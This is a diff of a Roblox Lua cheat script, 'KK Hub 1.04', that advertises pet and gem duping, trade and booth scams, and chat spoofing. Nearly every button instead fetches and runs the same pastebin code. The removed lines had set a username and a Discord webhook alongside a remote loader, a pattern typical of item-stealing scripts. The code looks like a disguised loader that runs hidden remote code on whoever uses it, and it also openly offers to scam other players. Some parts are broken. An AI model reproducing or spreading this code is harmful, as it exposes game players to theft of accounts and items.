@@ -1,4 +1,81 @@
-UserName = "AdministrativeItems"
-WebHook = "https://discord.com/api/webhooks/1057459990861979740/A6m9Z9z04mO2qDP-nG0HxyU3LPA5TPkU1c3-63Q-VIDmLPaHGakz5luvTS16HdCOhmJa"
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("KK Hub 1.04", "Synapse")
+    -- MAIN
+    local Main = Window:NewTab("DUPE")
+    local MainSection = Main:NewSection("Dupe Section")
+    loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+ 
+    MainSection:NewButton("Start Dupe", "Dupes", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+    end)
+ 
+    local MainSection = Main:NewSection("Dupe Options")
+ 
+    MainSection:NewButton("Dupe Equipped Pets", "Dupe pets", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))() 
+    end)
+ 
+    MainSection:NewButton("Dupe Gems", "Dupe Gems", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+    end)
+ 
+    MainSection:NewButton("Dupe All PETS", "Dupe All pets", function()
+       loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+    end)
+ 
+    local Main = Window:NewTab("TradeScam")
+    local MainSection = Main:NewSection("Scam In Trades")
+ 
+    MainSection:NewButton("Trade Scam", "GG", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))() 
+    end)
+ 
+    MainSection:NewButton("Trade Scam V2", "GG", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+    end)
+ 
+    local Main = Window:NewTab("BoothScam")
+    local MainSection = Main:NewSection("Boothscam")
+ 
+    MainSection:NewButton("Booth Scam", "GG", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))() 
+    end)
+ 
+    MainSection:NewButton("Booth Scam V2", "GG", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))() 
+    end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+  local Main = Window:NewTab("AutoFarm")
+    local MainSection = Main:NewSection("AutoFarm Section")
+ 
+    MainSection:NewButton("Start Autofarm", "AutoFarms", function()
+    MainSection:NewButton("Colect Orbs", "Colects Orbs", function()
+end)
+end)
+
+
+ local Main = Window:NewTab("Fake Hatcher")
+    local MainSection = Main:NewSection("Fake Hatcher")
+	print(txt)
+
+    --Other
+    local Other = Window:NewTab("Other")
+    local OtherSection = Other:NewSection("Other")
+ 
+    OtherSection:NewButton("Chat Spoofer", "Lets you chat for other people", function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/stq9Ljqx'),true))()
+    end)
+ 
+    OtherSection:NewButton("Bypassed Fly", "bird mode", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/stq9Ljqx"))() 
+ 
+        Fly(true)
+    end)
+ 
+    local Other = Window:NewTab("Info")
+    local OtherSection = Other:NewSection("Info")
+ 
+    OtherSection:NewButton("KK Hub 1.04 By SrNoodlesMan And thehell", "Info", function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/stq9Ljqx"), true))()
+ 
+    end)
